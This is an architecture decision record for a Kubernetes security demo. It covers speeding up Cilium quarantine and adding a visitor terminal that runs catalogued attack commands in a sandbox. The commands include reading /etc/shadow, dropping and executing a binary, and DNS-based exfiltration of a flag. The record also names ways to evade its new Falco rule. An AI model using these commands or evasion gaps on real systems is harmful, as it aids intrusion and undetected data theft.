# ADR 0032: The attacker's terminal, its detections, and bringing quarantine under three seconds

Date: 2026-10-02 · Status: accepted

## Context
The four one-click scenarios (ADR 0017, 0018) show detection and response, but the owner's verdict on the
live demo was that they "do not click": the visitor presses one button and watches, all four look the
same, and the defender always wins instantly, so nothing shows what the defence is worth. Two things this
ADR fixes, both under the CLUSTER half of the phase 5/6+ contract:

1. **Quarantine never showed its proof.** On a `network-tool` run Talon set the quarantine label, but the
   pod kept answering for tens of seconds; the API deleted it (QuarantineLinger, 5 s) long before Cilium
   cut it off, so no `unreachable` victim event ever fired. Measured on the node (2026-10-02): the
   CiliumEndpoint still carried `quarantine=false` 2 s after the label, and `tests/scenarios/run.sh` has
   seen 22-36 s from the label to DNS failing. For those seconds a "quarantined" pod is not isolated, and
   the visitor never sees the cut. The API and WEB halves of this fix are in their own ADRs (the linger
   change, and lighting hop 8 from the first `unreachable`); this ADR is the isolation latency itself.

2. **Every scenario was passive and identical.** The contract adds a fifth, interactive scenario: a real
   terminal the visitor types into, against a real hardened pod, reading real output until the cluster
   stops them - so that different actions end differently and the order of moves matters.

## Decision, part 1: label-to-isolation under three seconds

**Why it was slow.** Talon quarantines by adding `sdp.hubertjablon.ski/quarantine=true`, which the standing
CiliumClusterwideNetworkPolicy selects (ADR 0013). A Cilium policy selector matches an endpoint's *security
identity*, and an identity is the set of a pod's identity-relevant labels. So the label is necessarily
identity-relevant, and adding it forces the endpoint onto a new identity. From Cilium 1.19.8's source, a
new identity costs two things before the new policy applies:

- *allocation.* In `agent` identity-management mode the agent allocates the identity through a CiliumIdentity
  object and plumbs it into the SelectorCache (`pkg/allocator`, `pkg/identity/cache`). For an identity never
  seen before, that is an API-server round trip plus policy-map regeneration.
- *the grace period.* `pkg/endpoint`'s `identityLabelsChanged` sleeps `identity-change-grace-period` (default
  5 s) whenever the identity actually changes (`allocatedIdentity.ID != oldIdentity.ID`), so that other
  nodes can whitelist the upcoming identity before it is used.

Both costs were paid in full on every quarantine, because every scenario pod carried a unique
`sdp.hubertjablon.ski/run-id` (and `scenario`) label. Those labels were identity-relevant, so **every pod was
a brand-new identity**, and the quarantined pod (run-id + `quarantine=true`) was a brand-new identity again -
freshly allocated, with its policy computed from scratch, after the full 5 s grace period.

**The fix is two values in the Cilium config, kept identical in `cluster/apps/cilium.yaml` and the Ansible
cilium role (`scripts/check-cilium-values.sh` enforces equality):**

- `labels: "k8s:!sdp.hubertjablon.ski/run-id k8s:!sdp.hubertjablon.ski/scenario"`. Cilium's `labels` option
  appends to the default identity label list (`daemon/cmd/daemon_main.go` -> `labelsfilter.ParseLabelPrefixCfg`
  with an empty label-prefix-file; confirmed in `pkg/labelsfilter/filter.go`). These two entries are *ignore*
  rules, so the default whitelist flag stays off and every other label - the reserved labels, the namespace,
  `app.kubernetes.io/*`, and crucially `sdp.hubertjablon.ski/quarantine` - stays identity-relevant. Only the
  two per-run churn labels are removed. The result: all scenario pods in a namespace share **one stable
  identity**, and the quarantined identity (that identity plus `quarantine=true`) is stable too, so it can be
  reused across runs instead of a fresh identity per pod. It is **not** cached forever: Cilium's operator GCs an
  identity no endpoint has used (chart defaults `identityGCInterval` 15m, `identityHeartbeatTimeout` 30m), so on
  a quiet site the quarantined identity is reaped and the next quarantine allocates it cold again. What the
  change removes is the *guaranteed* cold allocation on every single run (unique `run-id` meant the quarantined
  identity was always new); within the GC window a quarantine is now a warm label flip. `run.sh` measures both a
  first (possibly cold) and an immediate second (warm) quarantine against the bound, rather than assuming warm.
- `identityChangeGracePeriod: "500ms"` (was the 5 s default). The grace period exists so other nodes can
  whitelist the new identity first. **This is a single-node cluster: there is no other node to wait for.**
  500 ms is enough to order the identity change ahead of the endpoint's datapath regeneration without the
  pathological zero; it removes ~4.5 s of pure sleep from the path.

**What is and isn't proven.** The 22-36 s was measured end to end (label to DNS failing); its exact breakdown -
how much was identity allocation, how much the 5 s grace, how much policy regeneration - was *not* isolated on
the node, so this ADR does not claim allocation alone caused it. What is claimed, and what `run.sh` holds to the
3 s bound live, is the before/after: the two changes above remove the 5 s grace (all but 500 ms) and the
per-run guaranteed cold allocation, and the quarantine label still changing the identity means an endpoint
still pays 500 ms + regeneration - a small, bounded cost on a warm identity. The expectation is well under the
3 s the contract asks for; the live integration is the measurement, cold and warm.

**Selecting the victim by a stable label.** The victim's one allowed flow (`sandbox-victim-from-api`, ADR
0022) and the API's matching egress rule selected scenario pods by `run-id Exists`. A CiliumNetworkPolicy
endpointSelector matches identity labels, and `run-id` is no longer one, so both now select the stable
`app.kubernetes.io/managed-by: portfolio-api` label the API already stamps on every pod it creates. The API's
egress rule also gains the twin namespace (ADR 0031).

**The test measures it the way the visitor sees it.** `tests/scenarios/run.sh` now stands up a pod in
`portfolio-api` with the API's identity and polls the victim's `/state.json` on :8080 exactly as the API does,
proves it answers before the attack, and then measures the time from the quarantine label to the first failed
poll - the precise moment the shop goes "unreachable" on the page - asserting it is within `QUARANTINE_BOUND`
(3 s). The victim's DNS egress failing is kept as corroboration with a looser bound. This is a live check;
it cannot run offline (no cluster, no Cilium datapath).

## Decision, part 2: the interactive terminal

A fifth scenario, `id: terminal`, `interactive: true`, in `cluster/infra/sandbox/scenarios/scenarios.yaml`.
The four one-click scenarios are unchanged and stay as "just show me". The terminal's shape (contract):
`timeout_seconds: 120`, `idle_seconds: 30` (300 and 90 since the 2026-10-03 amendment below), an
`objectives[]` list in kill-chain order, and a `commands[]` catalogue. The API runs a command only on the
visitor's request, **by id** - the only thing it accepts, never free text (contract hard rule) - so a
visitor's typing never reaches the cluster as a command.

**The pod** is the same hardened victim shop as the others: PSS `restricted`, read-only root filesystem, no
ServiceAccount token, the shop on :8080 polled by the API. Two differences, both already precedented:
`supplementalGroups: [42]` (the `shadow` group, as `sensitive-file-read`, so `cat /etc/shadow` can succeed and
be detected), and a 2 MiB shop emptyDir instead of 1 MiB (the `drop-run` command copies busybox into it). Per
run the API injects `SDP_FLAG` (`SDP{` + 16 hex + `}`) as an env var on container `target`; the victim writes
it to `/srv/shop/.flag` (0600) on start and never serves it (ADR 0022 amendment).

**The catalogue** is 14 commands grouped by the kill chain, each with an `outcome` (allowed | prevented |
detected), the `layer` that answers, a one-line `control`, and an `explain`. The spread is deliberate: the
quiet moves (recon, deface, read the flag) are allowed or prevented and the run continues, so a visitor who
does them first gets further; the loud ones end the run. Highlights:

- **allowed, visible:** `deface` rewrites the shop's own `index.html`/`state.json`; the shop window changes and
  no rule fires, because nothing watches an app writing its own docroot - the explanation says so.
- **allowed, objective:** `cat /srv/shop/.flag` prints the run's flag; the explanation says detection is not
  prevention, and that reading a secret in the pod is not the same as getting it out past a default-deny
  network.
- **prevented, by the pod itself:** `touch /bin/backdoor` (read-only root filesystem), reading the
  ServiceAccount token (there is none), `chown` (no CAP_CHOWN - every capability dropped). Each fails with the
  kernel's own message and nothing is killed.
- **detected, quarantine:** `wget ... http://127.0.0.1:9/` - the pod is quarantined and **the run goes on**
  (exec still works in a quarantined pod), with the shop going unreachable next to the visitor.
- **detected, terminate:** `cat /etc/shadow`, `sh -i` (a TTY shell), and `drop-run` - copy busybox into the
  shop volume and execute it.

**One new custom Falco rule.** `drop-run` executes from `/srv/shop`, an emptyDir. The stock "Drop and execute
new binary in container" rule keys on `proc.is_exe_upper_layer`, which is only the container's overlay upper
layer; an emptyDir is a separate mount, so a binary run from it slips past. `cluster/infra/falco` gains
**"SDP execution from shop volume"** (`proc.exepath startswith /srv/shop/`, CRITICAL), and
`cluster/infra/falco-response/talon/rules.yaml` gains **"Kill execution from shop volume in sandbox"**
(terminate). Nothing the image ships runs from `/srv/shop` (the server is `/usr/local/bin/victim`, busybox is
`/bin`), so for the catalogue's `drop-run` - which `exec`s the copied binary directly - the only way to match is
to drop and run something: the behaviour.

**What this rule does not catch, by design.** It keys on `proc.exepath`, the path of the executable the kernel
actually runs, so it sees a dropped *binary* run directly. It does not see a *script* fed to an interpreter:
`sh /srv/shop/x` runs `/bin/sh` (exepath `/bin/sh`, the script is only an argument); a shebang script records
the interpreter as the executable, not the script; and a binary launched through the dynamic loader
(`/lib/ld-musl-*.so.1 /srv/shop/x`) has the loader as its exepath. Those are real gaps, not covered here. The
tempting fix - also matching `/srv/shop` anywhere in `proc.cmdline` - is deliberately rejected: the `deface`
command's cmdline legitimately contains `/srv/shop`, so cmdline matching would fire on an allowed command and
make the rule lie. The honest rule catches the direct-execution case the catalogue demonstrates and is clear
about the rest; closing the interpreter gaps is a separate decision (more rules, or a broader drift approach),
not a quiet widening of this one. Both this rule and the existing "SDP network tool in sandbox" now match
`k8s.ns.name in (sdp_sandbox_namespaces)` - `sandbox` and the twin `sandbox-unguarded` (ADR 0031) - so
detection is identical in both; the Talon rules pin `k8s.ns.name=sandbox`,
so only the guarded pod is acted on.

**No new capability, no token, no name leak.** No command prints the environment, names a host outside the
pod, or resolves a name; `beacon` targets the pod's own loopback. The flag is the visitor's own run's secret
and is meant to be read; it is never served, only readable by a command inside the pod.

**Proven offline.** `tests/scenarios/offline.sh` gains a terminal section that runs every command under the
pod's own security context (built from `app/scenario`) and asserts its claimed outcome: an `allowed` command
really succeeds (and `read-flag` prints the flag, `deface` changes the shop), a `prevented` one really fails
with the pod's own refusal and writes nothing, and a `detected` one really meets its Falco rule's preconditions
(a successful sensitive-file open, a network tool's process name, a TTY for the shell, a binary executed from
`/srv/shop` with `/srv/shop` proven to be a separate mount so the stock drift rule is blind to it). The flag's
mode and the fact it is never served are also unit-tested in `app/scenario/victim`. `scripts/lib/scenario_pods.py`
validates every new catalogue field (ids, unique inputs, outcomes, layers, per-command detections) in
`make validate`.

## Consequences
- Taking `run-id`/`scenario` out of the identity means scenario pods are no longer each a unique Cilium
  identity. That is the point: the per-run churn guaranteed a cold quarantined identity on every run. The
  quarantined identity is now warm between runs within Cilium's identity GC window (15m/30m defaults); after a
  longer quiet spell the next quarantine is cold again, which `run.sh`'s first/second measurement exercises.
- The grace period is a cluster-wide Cilium setting. 500 ms is safe only because the cluster is one node; a
  multi-node cluster would want it back near the default. It is documented here and in both Cilium value files.
- The terminal lets a visitor run a dozen different commands against a real pod, each bounded by the same
  `restricted` pod, signed image, quota, default-deny network and Falco/Talon as the one-click scenarios. The
  API accepts ids only, so the visitor's free text never reaches the cluster.
- A new custom Falco rule is maintenance the next Falco bump must re-validate, which `make scenario-offline`
  turns into a red check rather than a silent miss. The terminal depends, like the drift scenario, on the
  overlayfs snapshotter and on emptyDir being a separate mount; the live test covers the link.
- Live checks integration must run (no cluster here): `tests/scenarios/run.sh` for the <3 s bound and the
  terminal's end states, and the live `make scenario-test`.

## Amendment 2026-10-03: the measured cause was `identity-max-jitter`, not allocation or the grace period

With part 1 deployed on its own (identity labels and the 500 ms grace), `tests/scenarios/run.sh` measured
label-to-cut live: 25.0 s cold, 10.8 s warm. Against a pod labelled by hand, the agent's log showed the whole
wait between "Resolving identity labels (non-blocking)" and "Identity of endpoint changed" (10.05 s), with the
BPF reload 65 ms after that and the probe dropped on the next poll. In `pkg/endpoint` (1.19.8),
`runIdentityResolver` hands the change to a controller with `Jitter: option.Config.CiliumIdentityMaxJitter`:
the agent waits a random time up to `--identity-max-jitter` (default 30 s) before acting on changed pod labels,
to spread identity churn across a large cluster. Every number measured so far (10-36 s) is that uniform delay
plus, cold, the allocation. On one node there is nothing to spread, so the value is `0s`, set through the
chart's `extraConfig` (the chart has no value for it). Both the `labels` change and the shorter grace stay:
they were right, they were not the bulk.

Also added: `rollOutCiliumPods: true`, because the first deployment showed that a ConfigMap change syncs and
then waits for a manual `rollout restart` of the agent; now a changed value takes effect on sync. The
measurement after this amendment is in the integration record, cold and warm.

## Amendment 2026-10-03: the terminal session is 300 s, idle 90 s

`timeout_seconds: 300`, `idle_seconds: 90` (were 120 and 30). Live, sessions - the owner's own included -
ended "session over" while the visitor was still reading: each command is followed by an explanation of
which layer answered and why, and 30 s without a command was less than it takes to read one, while two
minutes in all left room for only a handful of the 14 commands. The four one-click scenarios keep their 90 s.

What moved with it: the bound on every sandbox pod, 120 -> 300 s, in the API (`scenarios.MaxTimeout`), in
`make validate` (`scripts/lib/scenario_pods.py`) and in the cluster (`require-sandbox-deadline`, ADR 0031
amendment); see ADR 0017's amendment for the safety envelope. The terminal's pod now passes the victim
`-lifetime 300s`: the shop server exits after 120 s on its own (ADR 0022), which would have ended a
five-minute session at two, with the pod completing as if something had answered. `make validate` checks that
every victim scenario's lifetime covers its timeout.

The cost, accepted by the owner: the API runs one scenario at a time for everyone (ADR 0015), so while a
terminal is open another visitor may wait up to five minutes, watching that session read-only. The pod's
footprint is unchanged (one pod, the same requests and limits, inside the quota); only how long it may hold
the slot has grown.

The page has to follow, in `app/web`: it reads both values from `/api/scenarios/terminal/details`, but its
stale-run cut-off (`STALE_RUN_MS`, 180 s, written for a 120 s deadline) would declare a live five-minute
session over at three minutes, and its fallbacks for absent values are still 120 and 30.

Live checks (no cluster here): a terminal session left quiet ends `idle` after 90 s and one kept busy ends
`deadline` at 300 s with the shop still answering until then; `tests/admission/run.sh` admits 300 and refuses
301 in both sandbox namespaces.

## Amendment 2026-10-03: a fifteenth command, `dns-exfil`, resolves a name (ADR 0034)

"No command ... resolves a name" (part 2) gains one bounded exception, recorded in ADR 0017's amendment of
the same date: `dns-exfil` (objective "Phone home") reads the run's flag from `/srv/shop/.flag`, makes it one
DNS label and looks up `<label>.x.exfil.sdp.test.` with busybox `nslookup`, in a zone CoreDNS answers itself
and never forwards; the argv ends `; true` because `nslookup` exits non-zero on NXDOMAIN and the outcome is
"allowed". Falco has no rule for it by design - that blindness is the exhibit, and the live test asserts zero
Falco events, so a rule that starts catching it turns the test red. `tests/scenarios/offline.sh` proves the
argv and the label form under the pod's security context; the lookup itself is proven live. The SIEM's side
(the Hubble DNS finding, the correlation, the API's flag match) is ADR 0034's.

## Amendment 2026-10-04: `dns-exfil` exits 0 only on NXDOMAIN, not `; true` (siem contract D3, F10)

The amendment above has the argv end `; true`. As built it does not: a command reaches its objective
when it exits 0 (`Achieved = cmd.Objective != "" && code == 0`, runner/terminal.go), so `; true` would
mark "Phone home" achieved even in a quarantined pod, whose lookups Cilium drops before they leave the
pod - a claim the page must not make. The argv (cluster/infra/sandbox/scenarios/scenarios.yaml, id
`dns-exfil`) is `sh -c` with ash builtins and busybox `nslookup` only:
- read the first line of `/srv/shop/.flag`, strip `SDP{` and `}`; anything that is not exactly 16
  lowercase hex digits ends the command with exit 1 (`no flag found` for non-hex), so the label can
  only ever be `sdp-<16 hex>` and nothing else can be put into the name;
- look up the sinkhole's canary, `ok.exfil.sdp.test.`, and go on only if it answers 192.0.2.53, an
  answer only the cluster resolver's sinkhole block gives (ADR 0026 amendment of 2026-10-04); anything
  else ends the command with `sinkhole not answering, nothing sent` and exit 1, before the flagged
  name exists anywhere outside the pod;
- print `query sdp-<16 hex>.x.exfil.sdp.test.`, then `nslookup -type=a` of that name and its output;
- exit 0 only if the output says NXDOMAIN, 1 otherwise.
NXDOMAIN by itself would not prove the sinkhole answered - any resolver says it for a `.test` name,
the public root included; the canary, checked first, is what proves it. The catalogue's outcome stays
`allowed`: prevention lets the query through, and that is the exhibit.
Measured (tests/scenarios/offline.sh, terminal pod's security context): against the rendered CoreDNS
the command exits 0 with NXDOMAIN; against a resolver without the sinkhole the canary fails and the
flagged name never reaches it; with no network it exits 1 in under 0.1 s; against a resolver that
drops every query - what a quarantined pod meets - busybox `nslookup` gives up on the canary after
5.0-5.1 s and the command exits 1 (N9). The command is bounded by nslookup's own ~5 s (busybox has no
timeout option) and the API's 5 s CommandTimeout usually cuts it first; either way it is not achieved.
tests/scenarios/run.sh bounds its client with `timeout 6`, runs the command only after its sinkhole
check passed in the same run, and asserts both cases live (exit 0 with NXDOMAIN on the quiet pod; no
NXDOMAIN and a non-zero exit on the pod `beacon` quarantined).
The visitor's input line reads `nslookup sdp-<flag>.x.exfil.sdp.test.` and the explanation says that
the command reads the flag file, builds the label and checks first that the cluster resolver answers
the zone itself: what is displayed is what runs (M12).
